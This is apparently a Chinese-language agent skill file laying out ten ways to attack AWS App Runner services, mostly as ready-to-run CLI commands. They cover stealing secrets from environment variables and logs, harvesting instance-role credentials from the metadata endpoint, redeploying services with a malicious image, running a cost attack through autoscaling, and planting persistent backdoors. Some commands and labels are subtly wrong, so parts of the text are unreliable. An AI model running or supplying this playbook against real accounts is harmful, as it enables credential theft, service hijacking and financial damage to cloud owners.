---
name: aws-apprunner-attack
type: attack
category: serverless
platform: aws
severity: high
---

# AWS App Runner 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 App Runner
- 用户要求"攻击 App Runner"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出 App Runner 服务
aws apprunner list-services --query 'ServiceSummaryList[].ServiceName' --output text

# 3. 获取服务详情
aws apprunner describe-service --service-arn SERVICE_ARN
```

## 攻击方法

### 方法 1: 环境变量窃取

```bash
# 1. 获取服务详情
aws apprunner describe-service --service-arn SERVICE_ARN

# 2. 提取环境变量
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration.CodeRepositoryValues.RuntimeEnvironmentVariables'

# 3. 获取所有配置
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration'

# 4. 搜索敏感变量
aws apprunner describe-service --service-arn SERVICE_ARN | \
  jq -r '.Service.Spec.SourceConfiguration.CodeRepositoryValues.RuntimeEnvironmentVariables[] | select(.Name | test("password|secret|token|key"; "i"))'
```

### 方法 2: 访问令牌窃取

```bash
# 1. 获取源代码仓库配置
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration.CodeRepositoryValues'

# 2. 提取访问令牌
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration.CodeRepositoryValues.SourceCodeVersion'

# 3. 如果使用 ECR
# 获取镜像仓库凭证
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration.ImageRepositoryValues.ImageIdentifier'

# 4. 获取 ECR 凭证（如果配置了）
aws ecr get-authorization-token --registry-ids ACCOUNT_ID
```

### 方法 3: 实例角色利用

```bash
# 1. 获取实例角色
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.InstanceConfiguration.InstanceRoleArn'

# 2. 如果有角色 ARN
# 可以尝试模拟该角色

# 3. 通过服务访问实例元数据
# 如果可以访问容器，运行
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 4. 获取角色凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### 方法 4: 源代码仓库利用

```bash
# 1. 获取仓库信息
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration.CodeRepositoryValues.RepositoryUrl'

# 2. 如果是 CodeCommit
# 使用克隆URL
aws codecommit get-repository --repository-name REPO_NAME

# 3. 如果是 GitHub/Bitbucket
# 获取访问令牌
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.SourceConfiguration.CodeRepositoryValues.ConnectionArn'

# 4. 使用连接 ARN 访问仓库
aws apprunner list-connections
aws apprunner describe-connection --connection-arn CONNECTION_ARN
```

### 方法 5: 部署配置劫持

```bash
# 1. 获取当前服务配置
aws apprunner describe-service --service-arn SERVICE_ARN > /tmp/service-config.json

# 2. 修改配置使用恶意镜像
jq '.Service.Spec.SourceConfiguration.ImageRepositoryValues.ImageIdentifier = "attacker/malicious:latest"' \
  /tmp/service-config.json > /tmp/malicious-config.json

# 3. 更新服务
aws apprunner update-service \
  --service-arn SERVICE_ARN \
  --cli-input-json file://tmp/malicious-config.json

# 4. 或使用 ECR 镜像
aws apprunner update-service \
  --service-arn SERVICE_ARN \
  --source-configuration "ImageRepository={ImageIdentifier=ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/malicious:latest,ImageConfiguration={Port=8080}},ImageRepositoryType=ECR"
```

### 方法 6: 服务部署触发

```bash
# 1. 触发新部署
aws apprunner start-deployment \
  --service-arn SERVICE_ARN

# 2. 如果可以访问源代码仓库
# 提交恶意代码触发自动部署

# 3. 或推送恶意镜像到 ECR
docker tag alpine:latest ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/malicious:latest
docker push ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/malicious:latest
aws apprunner start-deployment --service-arn SERVICE_ARN
```

### 方法 7: 网络配置利用

```bash
# 1. 获取网络配置
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.NetworkConfiguration'

# 2. 检查是否配置了 VPC
aws apprunner describe-service --service-ARN SERVICE_ARN \
  --query 'Service.Spec.NetworkConfiguration.EgressConfiguration'

# 3. 如果配置了 VPC
# 可以访问内网资源

# 4. 获取安全组信息
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.NetworkConfiguration.IngressConfiguration.IsPubliclyAccessible'
```

### 方法 8: 日志和监控利用

```bash
# 1. 获取日志配置
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.HealthCheckConfiguration'

# 2. 如果启用了 CloudWatch Logs
# 访问日志
aws logs describe-log-streams \
  --log-group-name /aws/apprunner/SERVICE_NAME

# 3. 获取日志内容
aws logs get-log-events \
  --log-group-name /aws/apprunner/SERVICE_NAME \
  --log-stream-name LOG_STREAM_NAME

# 4. 搜索敏感信息
aws logs filter-log-events \
  --log-group-name /aws/apprunner/SERVICE_NAME \
  --filter-pattern "password|secret|token"
```

### 方法 9: 自动扩缩容利用

```bash
# 1. 获取自动扩缩容配置
aws apprunner describe-service --service-arn SERVICE_ARN \
  --query 'Service.Spec.AutoDeploymentsEnabled'

# 2. 如果启用自动部署
# 可以通过源代码仓库触发

# 3. 修改实例配置
aws apprunner update-service \
  --service-arn SERVICE_ARN \
  --instance_configuration "Cpu=4096,Memory=8192"

# 4. 触发扩容攻击（成本攻击）
aws apprunner update-service \
  --service-arn SERVICE_ARN \
  --auto-scaling-configuration "MinSize=10,MaxSize=100"
```

### 方法 10: 服务枚举和攻击

```bash
# 1. 列出所有区域的服务
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "=== Region: $region ==="
  aws apprunner list-services --region $region \
    --query 'ServiceSummaryList[].{Name:ServiceName,ARN:ServiceArn}' --output json
done

# 2. 批量获取服务配置
for arn in $(aws apprunner list-services --query 'ServiceSummaryList[].ServiceArn' --output text); do
  echo "=== $arn ==="
  aws apprunner describe-service --service-arn $arn
done > /tmp/apprunner-services.txt

# 3. 搜索所有服务的环境变量
for arn in $(aws apprunner list-services --query 'ServiceSummaryList[].ServiceArn' --output text); do
  aws apprunner describe-service --service-arn $arn | \
    jq -r '.Service.Spec.SourceConfiguration.CodeRepositoryValues.RuntimeEnvironmentVariables[]?'
done > /tmp/apprunner-env.txt
```

## 验证成功

```bash
# 成功列出服务
aws apprunner list-services

# 成功获取服务详情
aws apprunner describe-service --service-arn SERVICE_ARN

# 成功提取环境变量
aws apprunner describe-service --service-arn SERVICE_ARN | \
  jq -r '.Service.Spec.SourceConfiguration.CodeRepositoryValues.RuntimeEnvironmentVariables[]'
```

## 下一步

1. 分析窃取的凭证和配置
2. 使用获取的凭证访问云资源
3. 通过 App Runner 建立持久化后门
4. 攻击连接的 VPC 和内网资源
